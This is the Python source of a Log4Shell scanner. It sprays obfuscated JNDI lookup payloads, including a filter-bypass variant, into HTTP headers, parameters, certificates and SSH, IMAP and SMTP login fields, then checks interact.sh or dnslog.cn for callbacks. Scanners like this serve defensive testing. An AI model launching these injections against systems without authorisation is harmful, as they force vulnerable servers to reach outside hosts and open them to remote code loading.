import argparse
import asyncio
import base64
import json
import logging
import random
import smtplib
import string
import uuid
from enum import Enum
from time import sleep
from urllib.parse import urlparse

from utils import generate_client_cert

import httpx
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA
from paramiko import SSHClient
from paramiko.client import WarningPolicy
from imap_tools import MailBox
from smtplib import SMTP


class Dnslog:
    def __init__(self):
        self._client = httpx.Client()
        req = self._client.get("http://www.dnslog.cn/getdomain.php", timeout=30)
        self.domain = req.text

    def pull_logs(self):
        req = self._client.get("http://www.dnslog.cn/getrecords.php", timeout=30)
        return req.json()


class Interactsh:
    # Source: https://github.com/fullhunt/log4j-scan/blob/7be0f1c02ce3494469dc73a177e6f0c96f0016d9/log4j-scan.py#L163
    def __init__(self, token="", server=""):
        # Source: https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/modules/interactsh/__init__.py
        rsa = RSA.generate(2048)
        self.public_key = rsa.publickey().exportKey()
        self.private_key = rsa.exportKey()
        self.token = token
        self.server = server.lstrip('.') or 'interact.sh'
        self.headers = {
            "Content-Type": "application/json",
        }
        if self.token:
            self.headers['Authorization'] = self.token
        self.secret = str(uuid.uuid4())
        self.encoded = base64.b64encode(self.public_key).decode("utf8")
        guid = uuid.uuid4().hex.ljust(33, 'a')
        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
        self.domain = f'{guid}.{self.server}'
        self.correlation_id = self.domain[:20]

        self.client = httpx.Client()
        self.client.headers = self.headers
        self.register()

    def register(self):
        data = {
            "public-key": self.encoded,
            "secret-key": self.secret,
            "correlation-id": self.correlation_id
        }
        res = self.client.post(
            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
        if 'success' not in res.text:
            raise RuntimeError("Can not initiate interact.sh DNS callback client")

    def pull_logs(self):
        result = []
        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
        res = self.client.get(url, headers=self.headers, timeout=30).json()
        aes_key, data_list = res['aes_key'], res['data']
        for i in data_list:
            decrypt_data = self.__decrypt_data(aes_key, i)
            result.append(self.__parse_log(decrypt_data))
        return result

    def __decrypt_data(self, aes_key, data):
        private_key = RSA.importKey(self.private_key)
        cipher = PKCS1_OAEP.new(private_key, hashAlgo=SHA256)
        aes_plain_key = cipher.decrypt(base64.b64decode(aes_key))
        decode = base64.b64decode(data)
        blocksize = AES.block_size
        initialisation_vector = decode[:blocksize]
        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=initialisation_vector, segment_size=128)
        plain_text = cryptor.decrypt(decode)
        return json.loads(plain_text[16:])

    def __parse_log(self, log_entry):
        new_log_entry = {"timestamp": log_entry["timestamp"],
                         "host": f'{log_entry["full-id"]}.{self.domain}',
                         "remote_address": log_entry["remote-address"]
                         }
        return new_log_entry


PROTOCOLS = [
    "dns", "ldap", "ldaps", "rmi",
]

OBFUSCATIONS = [
    r"[CHAR]", r"${::-[CHAR]}", r"${lower:[CHAR]}", r"${upper:[CHAR]}"
]

HEADERS = [
    "Referer",
    "X-Api-Version",
    "Accept",
    "User-Agent",
    "X-Forwarded-For",
    "Origin",
    "Cookie",
    "Accept-Encoding",
    "Accept-Language",
]

POST_BODY = {
    'username': "[PAYLOAD]",
    'user': "[PAYLOAD]",
    'email': "[PAYLOAD]",
    'account': "[PAYLOAD]",
    'password': "[PAYLOAD]",
    'name': "[PAYLOAD]",
    'message': "[PAYLOAD]"
}

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
}

LOG_LEVELS = {
    "debug": logging.DEBUG,
    "info": logging.INFO,
    "error": logging.ERROR,
}


class BaseScanner:
    obfuscate_payloads = True
    request_path = None
    path_to_clientcert = None

    def __init__(self, obfuscate_payloads: bool, request_path: str, path_to_clientcert: str = None) -> None:
        self.obfuscate_payloads = obfuscate_payloads
        self.request_path = request_path
        self.path_to_clientcert = path_to_clientcert

    def get_request_path(self, choose_random_path):
        if choose_random_path or self.request_path is None:
            target_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
        else:
            target_path = self.request_path
        return target_path

    def _obfuscate_string(self, to_obfuscate: str) -> str:
        out = []
        for char in to_obfuscate:
            obfuscation: str = random.choice(OBFUSCATIONS)
            if "${" in obfuscation and "${::" not in obfuscation:
                obfuscation = obfuscation.replace("[CHAR]", random.choice(OBFUSCATIONS))
            out.append(obfuscation.replace("[CHAR]", char))
        return "".join(out)

    def create_payload(
        self, callback_url: str, protocol: str,
        test_path: str, test_domain: str = None,
        include_domain: bool = True, include_bypass: bool = False
    ) -> str:
        format_str = "${{{jndi}:{protocol}://{bypass}{target_callback}/{path}}}"

        if include_domain:
            target = f"{test_domain}.{callback_url}"
        else:
            target = callback_url
        return format_str.format(
            jndi=(self._obfuscate_string("jndi") if self.obfuscate_payloads else "jndi"),
            protocol=(self._obfuscate_string(protocol) if self.obfuscate_payloads else protocol),
            bypass="127.0.0.1#" if include_bypass else "",
            target_callback=target,
            path=test_path
        )

    def run_tests(self, target: str, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        raise NotImplementedError("Use a subclass to run tests.")


class HttpScanner(BaseScanner):
    proxy = None

    class InjectionPointType(Enum):
        Header = "header"
        GetParam = "get"
        PostParam = "post"

    def __init__(self, obfuscate_payloads: bool, request_path: str, path_to_clientcert: str, proxy: str, generate_clientcert: bool) -> None:
        super().__init__(obfuscate_payloads, request_path, path_to_clientcert)
        self.generate_clientcert = generate_clientcert
        self.proxy = proxy

    async def send_requests(self, client: httpx.AsyncClient, url: str, headers: dict, get_params: dict, post_params: dict) -> None:
        opened_requests = []
        try:
            if get_params or headers != DEFAULT_HEADERS:
                logging.debug("Sending GET")
                opened_requests.append(
                    client.get(
                        url,
                        params=get_params,
                        headers=headers,
                        timeout=3,
                    )
                )
                if get_params:
                    query_string = '&'.join(
                        [
                            f"{key}={value}" for key, value in get_params.items()
                        ]
                    )
                    opened_requests.append(
                        client.get(
                            f"{url}?{query_string}",
                            headers=headers,
                            timeout=3,
                        )
                    )
            if post_params or headers != DEFAULT_HEADERS:
                logging.debug("Sending POST as Form")
                opened_requests.append(
                    client.post(
                        url,
                        params=get_params,
                        headers=headers,
                        data=post_params,
                        timeout=3,
                    )
                )
                logging.debug("Sending POST as JSON")
                opened_requests.append(
                    client.post(
                        url,
                        params=get_params,
                        headers=headers,
                        json=post_params,
                        timeout=3,
                    ),
                )
        except Exception as excep:
            logging.exception(excep)
        for request in opened_requests:
            try:
                resp: httpx.Response = await request
                logging.debug(f"{resp.status_code}: {resp.reason_phrase}")
            except httpx.ConnectTimeout:
                pass
            except Exception as excep:
                logging.exception(excep)

    async def test_injection_point(self, injection_type: InjectionPointType, callback_host: str, url: str, is_domain_in_callback: bool = True, choose_random_path: bool = True):
        logging.info(f"Testing injection in {injection_type.value} with {callback_host} for {url}")

        target_path = self.get_request_path(choose_random_path)

        for protocol in PROTOCOLS:
            logging.info(f"Testing the {protocol} protocol handler.")
            for include_bypass in [False, True]:
                payload = self.create_payload(
                    callback_host, protocol,
                    target_path, urlparse(url).netloc,
                    is_domain_in_callback, include_bypass
                )
                logging.debug(f"Using payload: {payload}")
                if injection_type == self.InjectionPointType.GetParam:
                    params = {
                        "q": payload,
                        "t": payload.replace("{", r"%7B").replace("}", r"%7D")
                    }
                else:
                    params = None
                if injection_type == self.InjectionPointType.PostParam:
                    data = POST_BODY.copy()
                    for key in data.keys():
                        data[key] = data[key].replace("[PAYLOAD]", payload)
                else:
                    data = None
                if injection_type == self.InjectionPointType.Header:
                    headers_to_inject = [
                        {header_name: f'"{payload}"' if "Cookie" != header_name else f'session="{payload}"'} for header_name in HEADERS
                    ]
                else:
                    headers_to_inject = [DEFAULT_HEADERS.copy()]

                for header in headers_to_inject:
                    headers = DEFAULT_HEADERS.copy()
                    headers.update(header)
                    # logging.debug(f"Sending request with headers: {headers}")
                    async with httpx.AsyncClient(
                        verify=False,
                        proxies=self.proxy,
                        follow_redirects=True,
                        max_redirects=3,
                        cert=self.path_to_clientcert,
                    ) as client:
                        await self.send_requests(client, url, headers, params, data)

    async def test_all_injection_points(self, url: str, callback: str, domain_in_callback: bool = True, has_random_request_path: bool = True):
        for injection_type in self.InjectionPointType:
            try:
                await self.test_injection_point(injection_type, callback, url, domain_in_callback, has_random_request_path)
            except Exception as excep:
                logging.exception(str(excep))

    def run_tests(self, target: str, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        if self.generate_clientcert and not self.path_to_clientcert:
            target_domain = urlparse(target).netloc
            payload = self.create_payload(
                callback_domain, "dns",
                self.get_request_path(use_random_request_path),
                target_domain,
                is_domain_in_callback
            )
            generate_client_cert(
                emailAddress=f"{smtplib.quoteaddr(payload)}@{target_domain}",
                commonName=payload,
                subjectAltName=[f"DNS:{payload}"]
            )
            self.path_to_clientcert = "./injection.crt"
        asyncio.run(
            self.test_all_injection_points(
                target, callback_domain, not is_domain_in_callback, use_random_request_path
            )
        )


class SshScanner(BaseScanner):

    def __init__(self, obfuscate_payloads: bool, request_path: str, path_to_clientcert: str = None) -> None:
        super().__init__(obfuscate_payloads, request_path, path_to_clientcert)
        self._client = SSHClient()
        self._client.set_missing_host_key_policy(WarningPolicy)

    def run_tests(self, target: str, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        if ":" in target:
            hostname, port = target.split(':')
        else:
            hostname = target
            port = 22
        logging.info(f"Checking {hostname} on port {port} over SSH.")
        for protocol in PROTOCOLS:
            for include_bypass in [False, True]:
                payload = self.create_payload(
                    callback_domain, protocol,
                    self.get_request_path(use_random_request_path),
                    target,
                    is_domain_in_callback,
                    include_bypass
                )
                try:
                    self._client.connect(hostname=hostname, port=port, username=payload, password=payload, timeout=3, look_for_keys=False, auth_timeout=2)
                    self._client.close()
                except Exception as e:
                    logging.debug(e)
                if self.path_to_clientcert:
                    try:
                        self._client.connect(hostname=hostname, port=port, username=payload, key_filename=self.path_to_clientcert, timeout=3, look_for_keys=False, auth_timeout=2)
                        self._client.close()
                    except Exception as e:
                        logging.debug(e)


class ImapScanner(BaseScanner):

    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
        super().__init__(obfuscate_payloads, request_path)

    def run_tests(self, target: str, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        if ":" in target:
            hostname, port = target.split(':')
        else:
            hostname = target
            port = 993
        logging.info(f"Checking {hostname} on port {port} over IMAP.")
        for protocol in PROTOCOLS:
            for include_bypass in [False, True]:
                payload = self.create_payload(
                    callback_domain, protocol,
                    self.get_request_path(use_random_request_path),
                    target,
                    is_domain_in_callback,
                    include_bypass
                )
                try:
                    mailbox = MailBox(hostname, port=port)
                    mailbox.login(payload, payload, initial_folder=payload)
                    mailbox.logout()
                except Exception as e:
                    logging.debug(e)


class SmtpScanner(BaseScanner):

    def __init__(self, obfuscate_payloads: bool, request_path: str, local_hostname: str) -> None:
        super().__init__(obfuscate_payloads, request_path)
        self._local_hostname = local_hostname

    def run_tests(self, target: str, callback_domain: str, is_domain_in_callback: bool, use_random_request_path: bool):
        if ":" in target:
            hostname, port = target.split(':')
        else:
            hostname = target
            port = 25
        logging.info(f"Checking {hostname} on port {port} over SMTP.")
        for protocol in PROTOCOLS:
            for include_bypass in [False, True]:
                payload = self.create_payload(
                    callback_domain, protocol,
                    self.get_request_path(use_random_request_path),
                    target,
                    is_domain_in_callback,
                    include_bypass
                )
                try:
                    with SMTP(host=hostname, port=port, local_hostname=self._local_hostname) as smtp:
                        smtp.login(payload, payload)
                except Exception as e:
                    logging.debug(e)
                try:
                    with SMTP(host=hostname, port=port, local_hostname=self._local_hostname) as smtp:
                        smtp.sendmail(f"{smtplib.quoteaddr(payload)}@test.com", f"{smtplib.quoteaddr(payload)}@{hostname}", smtplib.quotedata(payload))
                except Exception as e:
                    logging.debug(e)


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser("A scanner to check for the log4j vulnerability")

    parser.add_argument('-t', '--target', help="The target to check", type=str, action="store", required=True)
    parser.add_argument('-p', '--protocol', help="which protocol to test", choices=["http", "ssh", "imap", "smtp"], default="http", type=str)
    parser.add_argument('-o', '--obfuscate', help="Whether payloads should be obfuscated or not", default=False, action="store_true")
    parser.add_argument('--certificate-path', help="Path to a client certificate for mTLS or SSH.", type=str, action="store", default=None)
    parser.add_argument('--no-payload-domain', help="Whether the original domain should be removed from the payload", default=False, action="store_true")
    parser.add_argument('--request-path', help="A custom path to add to the requests", type=str, default=None, action="store")
    parser.add_argument('-l', '--log-level', help="How detailed logging should be.", choices=LOG_LEVELS.keys(), default="error")

    http_opts = parser.add_argument_group("HTTP Options")
    http_opts.add_argument('--proxy', help="A proxy URL", type=str, default=None)
    http_opts.add_argument('--generate-clientcert', help="Generates a client certificate.", action="store_true", default=False)

    smtp_opts = parser.add_argument_group("SMTP Options")
    smtp_opts.add_argument('--local-hostname', help="The localhost name to use, defaults to the hostname of the computer", type=str, default=None)

    callback_group = parser.add_mutually_exclusive_group()
    callback_group.add_argument('--dns-callback', help="Which built-in DNS callback to use", type=str, choices=["interact.sh", "dnslog.cn"], default="interact.sh")
    callback_group.add_argument('--custom-callback', help="A different callback to use. Won't be checked by the application.", type=str, default=None)

    return parser.parse_args()


def main():
    arguments = parse_arguments()
    logging.basicConfig(
        level=LOG_LEVELS[arguments.log_level],
        format='[%(asctime)s] {%(filename)s:%(lineno)d} - %(levelname)s - %(message)s'
    )
    if arguments.proxy:
        global proxy
        proxy = arguments.proxy

    use_random_request_path = True
    if arguments.request_path:
        use_random_request_path = False

    dns_callback = None
    if arguments.custom_callback:
        callback_domain = arguments.custom_callback
    else:
        if arguments.dns_callback == "interact.sh":
            dns_callback = Interactsh()
        else:
            dns_callback = Dnslog()
        callback_domain = dns_callback.domain

    if arguments.protocol == "http":
        scanner = HttpScanner(arguments.obfuscate, arguments.request_path, arguments.certificate_path, arguments.proxy, arguments.generate_clientcert)
    elif arguments.protocol == "ssh":
        scanner = SshScanner(arguments.obfuscate, arguments.request_path, arguments.certificate_path)
    elif arguments.protocol == "imap":
        scanner = ImapScanner(arguments.obfuscate, arguments.request_path)
    elif arguments.protocol == "smtp":
        scanner = SmtpScanner(arguments.obfuscate, arguments.request_path, arguments.local_hostname)

    scanner.run_tests(
        arguments.target, callback_domain, not arguments.no_payload_domain, use_random_request_path
    )

    if not dns_callback:
        return

    sleep(10)
    records = dns_callback.pull_logs()
    print(records)


if __name__ == "__main__":
    main()
